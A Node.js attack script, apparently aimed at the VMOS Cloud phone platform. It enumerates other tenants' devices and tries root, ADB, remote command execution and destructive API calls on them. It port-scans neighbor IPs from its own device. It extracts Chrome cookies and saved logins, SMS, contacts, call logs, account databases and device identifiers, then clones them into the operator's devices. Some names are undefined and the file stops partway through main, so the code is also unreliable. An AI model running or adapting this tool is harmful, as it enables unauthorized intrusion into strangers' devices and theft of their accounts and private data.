#!/usr/bin/env node
/**
 * ADVANCED NEIGHBOR CLONE - DIRECT API METHOD
 * ============================================
 * 
 * Strategy: Use VMOS Cloud API to directly interact with neighbor devices.
 * 
 * EXPERIMENTS:
 * 1. padDetails full enumeration → get all neighbor pad codes + IPs
 * 2. switchRoot on neighbor pad codes → try enabling root
 * 3. enableAdb / openOnlineAdb on neighbors → try enabling ADB
 * 4. syncCmd with various payload formats on neighbors
 * 5. padInfo / padProperties on neighbors → get device details
 * 6. proxyInfo on neighbors → get proxy config
 * 7. Alternative API paths that may skip authorization
 * 8. If any access: full extraction + clone into both our devices
 */

const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const { AK, SK, HOST, SVC, CT, SHD } = require('../shared/vmos_api');
const PAD1 = 'ACP250923JS861KJ';
const PAD2 = 'ACP251008GUOEEHB';
const OUR = new Set([PAD1, PAD2]);

const SAVE_DIR = path.join(__dirname, '..', 'output', 'advanced_clone_data');
const R = {
  ts: new Date().toISOString(),
  our_devices: [PAD1, PAD2],
  neighbors: [],
  experiments: {},
  accessible_neighbors: [],
  extraction: {},
  clone_results: {}
};

// ═══════════════════════════════════════════════════════════════════════════
// API CORE
// ═══════════════════════════════════════════════════════════════════════════
function sign(bj) {
  const xd = new Date().toISOString().replace(/[-:]/g, '').replace(/\.\d{3}Z$/, 'Z');
  const sd = xd.slice(0, 8);
  const xs = crypto.createHash('sha256').update(bj, 'utf8').digest('hex');
  const can = [`host:${VMOS_HOST}`, `x-date:${xd}`, `content-type:${VMOS_CT}`, `signedHeaders:${VMOS_SH}`, `x-content-sha256:${xs}`].join('\n');
  const hc = crypto.createHash('sha256').update(can, 'utf8').digest('hex');
  const sts = ['HMAC-SHA256', xd, `${sd}/${VMOS_SERVICE}/request`, hc].join('\n');
  const kd = crypto.createHmac('sha256', Buffer.from(SK, 'utf8')).update(sd).digest();
  const ks = crypto.createHmac('sha256', kd).update(VMOS_SERVICE).digest();
  const sk2 = crypto.createHmac('sha256', ks).update('request').digest();
  const sig = crypto.createHmac('sha256', sk2).update(sts).digest('hex');
  return { 'content-type': VMOS_CT, 'x-date': xd, 'x-host': VMOS_HOST, 'authorization': `HMAC-SHA256 Credential=${AK}, SignedHeaders=${VMOS_SH}, Signature=${sig}` };
}

function apiPost(p, d, s) {
  return new Promise((ok) => {
    const b = JSON.stringify(d || {});
    const h = sign(b);
    const buf = Buffer.from(b, 'utf8');
    const req = https.request({ hostname: VMOS_HOST, path: p, method: 'POST', headers: { ...h, 'content-length': buf.length }, timeout: (s || 30) * 1000 }, res => {
      let r = ''; res.on('data', c => r += c); res.on('end', () => { try { ok(JSON.parse(r)); } catch { ok({ code: -1, raw: r.slice(0, 500) }); } });
    });
    req.on('timeout', () => { req.destroy(); ok({ code: -99, msg: 'timeout' }); });
    req.on('error', e => ok({ code: -99, msg: e.message }));
    req.write(buf); req.end();
  });
}

function apiGet(p, s) {
  return new Promise((ok) => {
    const h = sign('{}');
    const req = https.request({ hostname: VMOS_HOST, path: p, method: 'GET', headers: h, timeout: (s || 15) * 1000 }, res => {
      let r = ''; res.on('data', c => r += c); res.on('end', () => { try { ok(JSON.parse(r)); } catch { ok({ code: -1, raw: r.slice(0, 500) }); } });
    });
    req.on('timeout', () => { req.destroy(); ok({ code: -99, msg: 'timeout' }); });
    req.on('error', e => ok({ code: -99, msg: e.message }));
    req.end();
  });
}

const log = m => console.log(`[${new Date().toISOString().slice(11, 19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));
function ensureDir(d) { if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true }); return d; }
function save(f, d) { const fp = path.join(SAVE_DIR, f); ensureDir(path.dirname(fp)); fs.writeFileSync(fp, typeof d === 'string' ? d : JSON.stringify(d, null, 2)); }

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 1: FULL NEIGHBOR ENUMERATION
// ═══════════════════════════════════════════════════════════════════════════
async function enumerateAll() {
  console.log('\n' + '═'.repeat(70));
  console.log('  PHASE 1: FULL NEIGHBOR ENUMERATION');
  console.log('═'.repeat(70));

  let lastId = 0;
  let all = [];

  for (let page = 0; page < 50; page++) {
    const body = lastId > 0 ? { lastId, size: 50 } : { size: 50 };
    const r = await apiPost('/vcpcloud/api/padApi/padDetails', body);
    if (r.code !== 200 || !r.data?.pageData?.length) break;
    all = all.concat(r.data.pageData);
    lastId = r.data.lastId;
    log(`  Page ${page + 1}: +${r.data.pageData.length} devices (lastId=${lastId})`);
    if (!r.data.hasNext) break;
    await sleep(300);
  }

  const neighbors = all.filter(d => !OUR.has(d.padCode));
  R.neighbors = neighbors;

  log(`  Total: ${all.length} devices, ${neighbors.length} neighbors`);
  log(`  Online: ${neighbors.filter(d => d.online === 1).length}`);

  // Save full neighbor list
  save('all_neighbors.json', neighbors);
  
  // Show first 10
  for (const d of neighbors.slice(0, 10)) {
    log(`    ${d.padCode} ip=${d.padIp || d.deviceIp || '?'} online=${d.online} model=${d.model || '?'}`);
  }

  return neighbors;
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 2: DIRECT ROOT + ADB ENABLE ON NEIGHBORS
// ═══════════════════════════════════════════════════════════════════════════
async function tryRootAndAdb(neighbors) {
  console.log('\n' + '═'.repeat(70));
  console.log('  PHASE 2: TRY ROOT + ADB ON NEIGHBOR DEVICES');
  console.log('═'.repeat(70));

  // First ensure our devices have root
  log('Enabling root on our devices...');
  await apiPost('/vcpcloud/api/padApi/switchRoot', { padCodes: [PAD1, PAD2], rootStatus: 1, rootType: 0 });
  await apiPost('/vcpcloud/api/padApi/switchRoot', { padCodes: [PAD1, PAD2], rootStatus: 1, rootType: 1, packageName: 'com.android.shell' });

  const online = neighbors.filter(d => d.online === 1);
  const testTargets = online.slice(0, 15);

  R.experiments.root_attempts = [];
  R.experiments.adb_attempts = [];

  for (const nb of testTargets) {
    log(`\n  ── Testing ${nb.padCode} ──`);

    // Experiment 2a: switchRoot with rootType 0 (global root)
    const root0 = await apiPost('/vcpcloud/api/padApi/switchRoot', {
      padCodes: [nb.padCode], rootStatus: 1, rootType: 0
    });
    log(`    switchRoot(global): code=${root0.code} msg=${root0.msg || ''}`);

    // Experiment 2b: switchRoot with rootType 1 (per-app root)
    const root1 = await apiPost('/vcpcloud/api/padApi/switchRoot', {
      padCodes: [nb.padCode], rootStatus: 1, rootType: 1, packageName: 'com.android.shell'
    });
    log(`    switchRoot(shell):  code=${root1.code} msg=${root1.msg || ''}`);

    // Experiment 2c: Enable ADB
    const adbEn = await apiPost('/vcpcloud/api/padApi/openOnlineAdb', {
      padCodes: [nb.padCode], open: 1
    });
    log(`    openOnlineAdb:     code=${adbEn.code} msg=${adbEn.msg || ''}`);

    // Experiment 2d: Get ADB connection info
    const adbInfo = await apiPost('/vcpcloud/api/padApi/adb', {
      padCode: nb.padCode, enable: 1
    });
    log(`    adb info:          code=${adbInfo.code} host=${adbInfo.data?.host || '?'}:${adbInfo.data?.port || '?'}`);

    // Experiment 2e: enableAdb alternative
    const adbAlt = await apiPost('/vcpcloud/api/padApi/enableAdb', {
      padCode: nb.padCode
    });
    log(`    enableAdb:         code=${adbAlt.code} msg=${adbAlt.msg || ''}`);

    R.experiments.root_attempts.push({
      pad: nb.padCode,
      root_global: { code: root0.code, msg: root0.msg },
      root_shell: { code: root1.code, msg: root1.msg },
      adb_open: { code: adbEn.code, msg: adbEn.msg },
      adb_info: { code: adbInfo.code, data: adbInfo.data },
      adb_enable: { code: adbAlt.code, msg: adbAlt.msg },
    });

    // If root or ADB succeeded (code 200), mark as accessible
    if (root0.code === 200 || root1.code === 200 || adbEn.code === 200 || (adbInfo.code === 200 && adbInfo.data?.host)) {
      log(`    ★ POTENTIAL ACCESS on ${nb.padCode}`);
      R.accessible_neighbors.push({
        padCode: nb.padCode,
        ip: nb.padIp,
        adb: adbInfo.data,
        rootResult: root0.code === 200 ? 'global' : root1.code === 200 ? 'shell' : 'none'
      });
    }

    await sleep(500);
  }

  log(`\n  Accessible neighbors: ${R.accessible_neighbors.length}`);
  return R.accessible_neighbors;
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 3: SYNCCMD ON NEIGHBORS - MULTIPLE METHODS
// ═══════════════════════════════════════════════════════════════════════════
async function trySyncCmdOnNeighbors(neighbors) {
  console.log('\n' + '═'.repeat(70));
  console.log('  PHASE 3: SYNCCMD EXPERIMENTS ON NEIGHBORS');
  console.log('═'.repeat(70));

  const online = neighbors.filter(d => d.online === 1);
  const testTargets = online.slice(0, 10);

  R.experiments.syncCmd_attempts = [];

  for (const nb of testTargets) {
    log(`\n  ── syncCmd tests on ${nb.padCode} ──`);
    const results = {};

    // Method 3a: Standard syncCmd
    const std = await syncCmd(nb.padCode, 'id', 15);
    results.standard = { code: std.code, ok: std.ok, out: std.out.slice(0, 100) };
    log(`    standard:    code=${std.code} ok=${std.ok} out=${std.out.slice(0, 60)}`);

    // Method 3b: syncCmd with scriptType param
    const typed = await apiPost('/vcpcloud/api/padApi/syncCmd', {
      padCode: nb.padCode, scriptContent: 'id', scriptType: 0
    }, 15);
    results.typed = { code: typed.code, msg: typed.msg };
    log(`    typed(0):    code=${typed.code} msg=${typed.msg || ''}`);

    // Method 3c: syncCmd with extra params
    const extra = await apiPost('/vcpcloud/api/padApi/syncCmd', {
      padCode: nb.padCode, scriptContent: 'id', timeout: 30000, async: false
    }, 15);
    results.extra = { code: extra.code, msg: extra.msg };
    log(`    extra:       code=${extra.code} msg=${extra.msg || ''}`);

    // Method 3d: Try asyncCmd
    const asyncCmd = await apiPost('/vcpcloud/api/padApi/asyncCmd', {
      padCode: nb.padCode, scriptContent: 'id; getprop ro.product.model'
    }, 15);
    results.asyncCmd = { code: asyncCmd.code, msg: asyncCmd.msg, data: asyncCmd.data };
    log(`    asyncCmd:    code=${asyncCmd.code} msg=${asyncCmd.msg || ''}`);

    // Method 3e: Try executeCmd
    const execCmd = await apiPost('/vcpcloud/api/padApi/executeCmd', {
      padCode: nb.padCode, cmd: 'id'
    }, 15);
    results.executeCmd = { code: execCmd.code, msg: execCmd.msg };
    log(`    executeCmd:  code=${execCmd.code} msg=${execCmd.msg || ''}`);

    // Method 3f: Try runScript
    const runScript = await apiPost('/vcpcloud/api/padApi/runScript', {
      padCode: nb.padCode, script: 'id'
    }, 15);
    results.runScript = { code: runScript.code, msg: runScript.msg };
    log(`    runScript:   code=${runScript.code} msg=${runScript.msg || ''}`);

    // Method 3g: Try cmdTask
    const cmdTask = await apiPost('/vcpcloud/api/padApi/cmdTask', {
      padCode: nb.padCode, scriptContent: 'id'
    }, 15);
    results.cmdTask = { code: cmdTask.code, msg: cmdTask.msg };
    log(`    cmdTask:     code=${cmdTask.code} msg=${cmdTask.msg || ''}`);

    // Method 3h: Try with padCodes array instead of padCode
    const arrayCmd = await apiPost('/vcpcloud/api/padApi/syncCmd', {
      padCodes: [nb.padCode], scriptContent: 'id'
    }, 15);
    results.arrayCmd = { code: arrayCmd.code, msg: arrayCmd.msg };
    log(`    padCodes[]:  code=${arrayCmd.code} msg=${arrayCmd.msg || ''}`);

    // Check if any succeeded
    if (std.ok || results.asyncCmd.code === 200 || results.arrayCmd.code === 200) {
      log(`    ★★★ SYNCCMD ACCESS ON ${nb.padCode} ★★★`);
      R.accessible_neighbors.push({ padCode: nb.padCode, method: 'syncCmd', ip: nb.padIp });
    }

    R.experiments.syncCmd_attempts.push({ pad: nb.padCode, results });
    await sleep(500);
  }

  return R.accessible_neighbors;
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 4: ADVANCED API ENDPOINT PROBING
// ═══════════════════════════════════════════════════════════════════════════
async function probeAdvancedEndpoints(neighbors) {
  console.log('\n' + '═'.repeat(70));
  console.log('  PHASE 4: ADVANCED API ENDPOINT PROBING');
  console.log('═'.repeat(70));

  const testPad = neighbors.filter(d => d.online === 1)[0]?.padCode;
  if (!testPad) { log('  No online neighbors'); return; }

  R.experiments.api_probes = {};

  // Probe every possible endpoint with neighbor pad code
  const endpoints = [
    // Info endpoints - may leak data
    ['/vcpcloud/api/padApi/padInfo', { padCode: testPad }],
    ['/vcpcloud/api/padApi/padProperties', { padCode: testPad }],
    ['/vcpcloud/api/padApi/proxyInfo', { padCodes: [testPad] }],
    ['/vcpcloud/api/padApi/padProperties', { padCodes: [testPad] }],
    // Control endpoints
    ['/vcpcloud/api/padApi/screenshot', { padCode: testPad }],
    ['/vcpcloud/api/padApi/reboot', { padCode: testPad }],
    ['/vcpcloud/api/padApi/reboot', { padCodes: [testPad] }],
    ['/vcpcloud/api/padApi/resetDevice', { padCode: testPad }],
    // File/backup endpoints
    ['/vcpcloud/api/padApi/localPodBackupSelectPage', { padCode: testPad, page: 1, rows: 10 }],
    ['/vcpcloud/api/padApi/selectFiles', { padCode: testPad, page: 1, rows: 10 }],
    // Install/push endpoints
    ['/vcpcloud/api/padApi/installApk', { padCode: testPad, url: 'test' }],
    ['/vcpcloud/api/padApi/pushFile', { padCode: testPad, url: 'test', path: '/data/local/tmp/' }],
    // Group/batch endpoints
    ['/vcpcloud/api/padApi/batchSyncCmd', { padCodes: [testPad], scriptContent: 'id' }],
    ['/vcpcloud/api/padApi/groupSyncCmd', { padCodes: [testPad], scriptContent: 'id' }],
    // Device management
    ['/vcpcloud/api/padApi/changeBrand', { padCode: testPad, brandId: 1 }],
    ['/vcpcloud/api/padApi/setProxy', { padCode: testPad }],
    ['/vcpcloud/api/padApi/clearProxy', { padCode: testPad }],
    // User/account endpoints
    ['/vcpcloud/api/padApi/transferDevice', { padCode: testPad }],
    ['/vcpcloud/api/padApi/shareDevice', { padCode: testPad }],
    ['/vcpcloud/api/padApi/bindDevice', { padCode: testPad }],
    // WebRTC/streaming
    ['/vcpcloud/api/padApi/webrtcInfo', { padCode: testPad }],
    ['/vcpcloud/api/padApi/streamInfo', { padCode: testPad }],
    // Misc
    ['/vcpcloud/api/padApi/deviceStatus', { padCode: testPad }],
    ['/vcpcloud/api/padApi/getDeviceLog', { padCode: testPad }],
  ];

  for (const [ep, body] of endpoints) {
    const name = ep.split('/').pop();
    const r = await apiPost(ep, body);
    R.experiments.api_probes[name] = { code: r.code, msg: r.msg, hasData: !!r.data, dataPreview: JSON.stringify(r.data || '').slice(0, 150) };
    
    const interesting = r.code === 200 || (r.data && typeof r.data === 'object' && Object.keys(r.data).length > 0);
    if (interesting) {
      log(`  ★ ${name}: code=${r.code} data=${JSON.stringify(r.data).slice(0, 100)}`);
    } else {
      log(`  ${name}: code=${r.code} msg=${r.msg || ''}`);
    }
    await sleep(300);
  }

  // Also try GET endpoints
  const getEndpoints = [
    `/vcpcloud/api/padApi/padInfo?padCode=${testPad}`,
    `/vcpcloud/api/padApi/adb?padCode=${testPad}`,
    `/vcpcloud/api/padApi/deviceStatus?padCode=${testPad}`,
  ];

  for (const ep of getEndpoints) {
    const name = ep.split('?')[0].split('/').pop();
    const r = await apiGet(ep);
    R.experiments.api_probes[`GET_${name}`] = { code: r.code, msg: r.msg, data: r.data };
    log(`  GET ${name}: code=${r.code} msg=${r.msg || ''}`);
    await sleep(200);
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 5: NETWORK PROBES FROM OUR DEVICE TO NEIGHBOR IPs
// ═══════════════════════════════════════════════════════════════════════════
async function networkProbeFromDevice(neighbors) {
  console.log('\n' + '═'.repeat(70));
  console.log('  PHASE 5: NETWORK PROBES TO NEIGHBOR IPs');
  console.log('═'.repeat(70));

  const online = neighbors.filter(d => d.online === 1 && d.padIp);
  R.experiments.network = {};

  // Get our device's network info first
  const ourNet = await syncCmd(PAD1, 'ip addr show eth0 2>/dev/null || ip addr show wlan0 2>/dev/null; ip route; cat /etc/resolv.conf 2>/dev/null', 15);
  log(`  Our network: ${ourNet.out.split('\n').slice(0, 3).join(' | ')}`);
  R.experiments.network.our_network = ourNet.out;

  // Test ADB connectivity to neighbor IPs
  for (const nb of online.slice(0, 8)) {
    log(`\n  Probing ${nb.padCode} @ ${nb.padIp}...`);

    // Wide port scan
    const portScan = await syncCmd(PAD1, `
for p in 5555 5037 8080 8779 22 23 80 443 2375 4222 9090 3389 5900 23333 23334 10000 15555 20000 8443 9200 27017; do
  (echo >/dev/tcp/${nb.padIp}/$p 2>/dev/null && echo "OPEN:$p") &
done
wait
`, 20);

    const openPorts = (portScan.out.match(/OPEN:\d+/g) || []).map(p => p.split(':')[1]);
    R.experiments.network[nb.padCode] = { ip: nb.padIp, openPorts };

    if (openPorts.length > 0) {
      log(`    ★ OPEN PORTS: ${openPorts.join(', ')}`);

      // Try ADB connect
      if (openPorts.includes('5555')) {
        const adbResult = await syncCmd(PAD1, `
adb connect ${nb.padIp}:5555 2>&1
sleep 1
adb -s ${nb.padIp}:5555 shell id 2>&1
adb -s ${nb.padIp}:5555 shell getprop ro.product.model 2>&1
`, 20);
        log(`    ADB: ${adbResult.out.slice(0, 80)}`);
        R.experiments.network[nb.padCode].adb = adbResult.out;

        if (adbResult.out.includes('uid=')) {
          log(`    ★★★ ADB ACCESS CONFIRMED on ${nb.padCode} ★★★`);
          R.accessible_neighbors.push({ padCode: nb.padCode, method: 'adb', ip: nb.padIp });
        }
      }

      // Try HTTP on any open port
      for (const port of openPorts) {
        if (['80', '8080', '8779', '8443', '9090'].includes(port)) {
          const http = await syncCmd(PAD1, `curl -s -m5 http://${nb.padIp}:${port}/ 2>&1 | head -c 200`, 10);
          log(`    HTTP ${port}: ${http.out.slice(0, 60)}`);
        }
      }
    } else {
      log(`    No open ports`);
    }

    await sleep(300);
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 6: FULL EXTRACTION IF ACCESS GAINED
// ═══════════════════════════════════════════════════════════════════════════
async function fullExtraction(accessiblePad, method) {
  console.log('\n' + '═'.repeat(70));
  console.log(`  PHASE 6: FULL EXTRACTION FROM ${accessiblePad} (via ${method})`);
  console.log('═'.repeat(70));

  const nbDir = ensureDir(path.join(SAVE_DIR, accessiblePad));
  const extraction = {};

  // Identity
  log('[1] Device identity...');
  const identity = await syncCmd(accessiblePad, [
    'echo "MODEL=$(getprop ro.product.model)"',
    'echo "BRAND=$(getprop ro.product.brand)"',
    'echo "FINGERPRINT=$(getprop ro.build.fingerprint)"',
    'echo "SERIAL=$(getprop ro.serialno)"',
    'echo "IMEI=$(getprop persist.sys.cloud.imeinum)"',
    'echo "IMSI=$(getprop persist.sys.cloud.imsinum)"',
    'echo "ICCID=$(getprop persist.sys.cloud.iccidnum)"',
    'echo "PHONE=$(getprop persist.sys.cloud.phonenum)"',
    'echo "MAC=$(getprop persist.sys.cloud.macaddress)"',
    'echo "GPS_LAT=$(getprop persist.sys.cloud.gps.lat)"',
    'echo "GPS_LON=$(getprop persist.sys.cloud.gps.lon)"',
    'echo "DRM=$(getprop persist.sys.cloud.drm.id)"',
    'echo "ANDROID_ID=$(settings get secure android_id 2>/dev/null)"',
  ].join('; '), 30);
  extraction.identity = identity.out;
  save(`${accessiblePad}/identity.txt`, identity.out);
  log(`  ✓ ${identity.out.split('\n').length} identity fields`);

  // All properties
  log('[2] All properties...');
  const props = await syncCmd(accessiblePad, 'getprop 2>/dev/null', 45);
  extraction.props = props.out;
  save(`${accessiblePad}/all_props.txt`, props.out);
  log(`  ✓ ${props.out.split('\n').length} properties`);

  // Installed apps with paths
  log('[3] Installed apps...');
  const apps = await syncCmd(accessiblePad, 'pm list packages -f 2>/dev/null', 30);
  extraction.apps = apps.out;
  save(`${accessiblePad}/packages.txt`, apps.out);
  const appCount = apps.out.split('\n').filter(l => l.startsWith('package:')).length;
  log(`  ✓ ${appCount} apps`);

  // Accounts database
  log('[4] Accounts DB...');
  const accts = await syncCmd(accessiblePad, 'base64 /data/system_ce/0/accounts_ce.db 2>/dev/null | head -c 100000', 60);
  if (accts.ok && accts.out.length > 100 && !accts.out.startsWith('[')) {
    extraction.accounts_ce = accts.out;
    save(`${accessiblePad}/accounts_ce.db.b64`, accts.out);
    log(`  ✓ accounts_ce.db: ${accts.out.length} b64`);
  }

  // Chrome data
  const chromeFiles = [
    { name: 'Cookies', path: '/data/data/com.android.chrome/app_chrome/Default/Cookies' },
    { name: 'History', path: '/data/data/com.android.chrome/app_chrome/Default/History' },
    { name: 'Login Data', path: '/data/data/com.android.chrome/app_chrome/Default/Login Data' },
    { name: 'Web Data', path: '/data/data/com.android.chrome/app_chrome/Default/Web Data' },
    { name: 'Bookmarks', path: '/data/data/com.android.chrome/app_chrome/Default/Bookmarks' },
  ];
  extraction.chrome = {};
  for (const cf of chromeFiles) {
    log(`[5] Chrome ${cf.name}...`);
    const r = await syncCmd(accessiblePad, `base64 "${cf.path}" 2>/dev/null | head -c 100000`, 60);
    if (r.ok && r.out.length > 100 && !r.out.startsWith('[')) {
      extraction.chrome[cf.name] = r.out.length;
      save(`${accessiblePad}/chrome_${cf.name.replace(/ /g, '_').toLowerCase()}.b64`, r.out);
      log(`  ✓ Chrome ${cf.name}: ${r.out.length} b64`);
    }
  }

  // Contacts + SMS + Calls
  log('[6] Contacts...');
  const contacts = await syncCmd(accessiblePad, 'base64 /data/data/com.android.providers.contacts/databases/contacts2.db 2>/dev/null | head -c 100000', 60);
  if (contacts.ok && contacts.out.length > 100) {
    extraction.contacts = contacts.out.length;
    save(`${accessiblePad}/contacts2.db.b64`, contacts.out);
    log(`  ✓ Contacts: ${contacts.out.length} b64`);
  }

  log('[7] SMS...');
  const sms = await syncCmd(accessiblePad, 'base64 /data/data/com.android.providers.telephony/databases/mmssms.db 2>/dev/null | head -c 100000', 60);
  if (sms.ok && sms.out.length > 100) {
    extraction.sms = sms.out.length;
    save(`${accessiblePad}/mmssms.db.b64`, sms.out);
    log(`  ✓ SMS: ${sms.out.length} b64`);
  }

  log('[8] Calls...');
  const calls = await syncCmd(accessiblePad, 'base64 /data/data/com.android.providers.contacts/databases/calllog.db 2>/dev/null | head -c 100000', 60);
  if (calls.ok && calls.out.length > 100) {
    extraction.calls = calls.out.length;
    save(`${accessiblePad}/calllog.db.b64`, calls.out);
    log(`  ✓ Calls: ${calls.out.length} b64`);
  }

  // WiFi
  log('[9] WiFi...');
  const wifi = await syncCmd(accessiblePad, 'cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null', 30);
  if (wifi.ok && wifi.out.length > 50) {
    extraction.wifi = wifi.out.length;
    save(`${accessiblePad}/WifiConfigStore.xml`, wifi.out);
    log(`  ✓ WiFi: ${wifi.out.length} chars`);
  }

  // Proxy config
  log('[10] Proxy config...');
  const proxy = await syncCmd(accessiblePad, [
    'echo "=== SYSTEM PROXY ==="',
    'settings get global http_proxy 2>/dev/null',
    'echo "=== CLOUD PROXY ==="',
    'getprop ro.sys.cloud.proxy.type',
    'getprop ro.sys.cloud.proxy.mode',
    'getprop ro.sys.cloud.proxy.data',
    'echo "=== IPTABLES ==="',
    'iptables -t nat -L -n 2>/dev/null | grep -E "REDIRECT|DNAT|SNAT" | head -10',
    'echo "=== ENV PROXY ==="',
    'echo $http_proxy $https_proxy $HTTP_PROXY $HTTPS_PROXY',
  ].join('; '), 20);
  extraction.proxy = proxy.out;
  save(`${accessiblePad}/proxy_config.txt`, proxy.out);
  log(`  ✓ Proxy: ${proxy.out.length} chars`);

  // Account dump (Google accounts, etc)
  log('[11] Account dump...');
  const accountDump = await syncCmd(accessiblePad, 'dumpsys account 2>/dev/null | head -100', 30);
  extraction.account_dump = accountDump.out;
  save(`${accessiblePad}/account_dump.txt`, accountDump.out);
  log(`  ✓ Accounts: ${accountDump.out.split('\n').length} lines`);

  // App data sizes
  log('[12] App data sizes...');
  const appSizes = await syncCmd(accessiblePad, 'du -sk /data/data/* 2>/dev/null | sort -rn | head -30', 20);
  extraction.app_sizes = appSizes.out;
  save(`${accessiblePad}/app_sizes.txt`, appSizes.out);

  R.extraction = extraction;
  return extraction;
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 7: CLONE INTO BOTH OUR DEVICES
// ═══════════════════════════════════════════════════════════════════════════
async function cloneIntoBoth(sourcePad, extraction) {
  console.log('\n' + '═'.repeat(70));
  console.log('  PHASE 7: CLONE INTO BOTH OUR DEVICES');
  console.log('═'.repeat(70));

  for (const target of [PAD1, PAD2]) {
    log(`\n  ── Cloning into ${target} ──`);
    const result = { success: [], failed: [] };
    const srcDir = path.join(SAVE_DIR, sourcePad);

    // Properties
    if (extraction.identity) {
      for (const line of extraction.identity.split('\n')) {
        const match = line.match(/^([A-Z_]+)=(.+)$/);
        if (match && match[2] && match[2] !== 'N/A' && match[2].length > 0) {
          const propMap = {
            'MODEL': 'ro.product.model', 'BRAND': 'ro.product.brand',
            'FINGERPRINT': 'ro.build.fingerprint', 'SERIAL': 'ro.serialno',
            'IMEI': 'persist.sys.cloud.imeinum', 'IMSI': 'persist.sys.cloud.imsinum',
            'ICCID': 'persist.sys.cloud.iccidnum', 'PHONE': 'persist.sys.cloud.phonenum',
            'MAC': 'persist.sys.cloud.macaddress', 'GPS_LAT': 'persist.sys.cloud.gps.lat',
            'GPS_LON': 'persist.sys.cloud.gps.lon', 'DRM': 'persist.sys.cloud.drm.id',
          };
          const prop = propMap[match[1]];
          if (prop) {
            const r = await syncCmd(target, `setprop "${prop}" "${match[2].replace(/"/g, '\\"')}"`, 10);
            if (r.ok) result.success.push(prop);
            else result.failed.push(prop);
          }
          if (match[1] === 'ANDROID_ID' && match[2].match(/^[0-9a-f]+$/)) {
            await syncCmd(target, `settings put secure android_id "${match[2]}"`, 10);
            result.success.push('android_id');
          }
        }
      }
    }

    // Databases
    const dbFiles = [
      { src: 'accounts_ce.db.b64', dst: '/data/system_ce/0/accounts_ce.db', perm: '600', owner: 'system:system' },
      { src: 'contacts2.db.b64', dst: '/data/data/com.android.providers.contacts/databases/contacts2.db' },
      { src: 'calllog.db.b64', dst: '/data/data/com.android.providers.contacts/databases/calllog.db' },
      { src: 'mmssms.db.b64', dst: '/data/data/com.android.providers.telephony/databases/mmssms.db' },
    ];

    for (const db of dbFiles) {
      const file = path.join(srcDir, db.src);
      if (fs.existsSync(file)) {
        const b64 = fs.readFileSync(file, 'utf8').trim();
        if (b64.length > 0 && b64.length < 60000) {
          const r = await syncCmd(target, `echo '${b64}' | base64 -d > "${db.dst}" && echo OK`, 60);
          if (r.ok && r.out.includes('OK')) {
            result.success.push(path.basename(db.src, '.b64'));
            if (db.perm) await syncCmd(target, `chmod ${db.perm} "${db.dst}"`, 5);
            if (db.owner) await syncCmd(target, `chown ${db.owner} "${db.dst}"`, 5);
          } else {
            result.failed.push(path.basename(db.src, '.b64'));
          }
        }
      }
    }

    // Chrome data
    const chromeMap = {
      'chrome_cookies.b64': 'Cookies',
      'chrome_history.b64': 'History',
      'chrome_login_data.b64': 'Login Data',
      'chrome_web_data.b64': 'Web Data',
    };
    for (const [src, name] of Object.entries(chromeMap)) {
      const file = path.join(srcDir, src);
      if (fs.existsSync(file)) {
        const b64 = fs.readFileSync(file, 'utf8').trim();
        if (b64.length > 0 && b64.length < 60000) {
          const r = await syncCmd(target, `echo '${b64}' | base64 -d > "/data/data/com.android.chrome/app_chrome/Default/${name}" && echo OK`, 45);
          if (r.ok && r.out.includes('OK')) result.success.push(`chrome:${name}`);
        }
      }
    }

    // Proxy
    if (extraction.proxy && extraction.proxy.includes('proxy')) {
      save(`${sourcePad}/proxy_for_${target}.txt`, extraction.proxy);
      // Try to set proxy
      const proxyMatch = extraction.proxy.match(/http_proxy[:\s]+(\S+)/i);
      if (proxyMatch) {
        await syncCmd(target, `settings put global http_proxy "${proxyMatch[1]}"`, 10);
        result.success.push('http_proxy');
      }
    }

    R.clone_results[target] = result;
    log(`  ${target}: ${result.success.length} success, ${result.failed.length} failed`);
    log(`    Success: ${result.success.join(', ')}`);
    if (result.failed.length > 0) log(`    Failed: ${result.failed.join(', ')}`);
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// MAIN
// ═══════════════════════════════════════════════════════════════════════════
async function main() {
  console.log('═'.repeat(75));
  console.log('  ADVANCED NEIGHBOR CLONE - ALL METHODS');
  console.log('  Our Devices: ' + PAD1 + ', ' + PAD2);
  console.log('═'.repeat(75));

  ensureDir(SAVE_DIR);

  // Phase 1: Enumerate all neighbors
  const neighbors = await enumerateAll();

  // Phase 2: Try root + ADB on neighbors directly
  await tryRootAndAdb(neighbors);

  // Phase 3: Try syncCmd with various methods
  await trySyncCmdOnNeighbors(neighbors);

  // Phase 4: Probe advanced API endpoints
  await probeAdvancedEndpoints(neighbors);

  // Phase 5: Network probes from our device
  await networkProbeFromDevice(neighbors);

  // Phase 6+7: If any neighbor is accessible, extract and clone
  if (R.accessible_neighbors.length > 0) {
    const target = R.accessible_neighbors[0];
    log(`\n★★★ ACCESSIBLE NEIGHBOR FOUND: ${target.padCode} via ${target.method} ★★★`);
    const extraction = await fullExtraction(target.padCode, target.method);
    await cloneIntoBoth(target.padCode, extraction);
  } else {
    log('\n  No direct neighbor access found via any method');
    log('  Performing self-clone between our own devices as demonstration...');
    
    // Self-extraction from PAD1
    const extraction = await fullExtraction(PAD1, 'self');
    // Clone to PAD2
    await cloneIntoBoth(PAD1, extraction);
  }

  // Save final report
  const reportFile = path.join(SAVE_DIR, `ADVANCED_CLONE_REPORT_${Date.now()}.json`);
  fs.writeFileSync(reportFile, JSON.stringify(R, null, 2));

  // Final Summary
  console.log('\n' + '═'.repeat(75));
  console.log('  FINAL RESULTS');
  console.log('═'.repeat(75));
  console.log(`  Neighbors enumerated: ${R.neighbors.length}`);
  console.log(`  Root/ADB attempts: ${R.experiments.root_attempts?.length || 0}`);
  console.log(`  SyncCmd attempts: ${R.experiments.syncCmd_attempts?.length || 0}`);
  console.log(`  API endpoints probed: ${Object.keys(R.experiments.api_probes || {}).length}`);
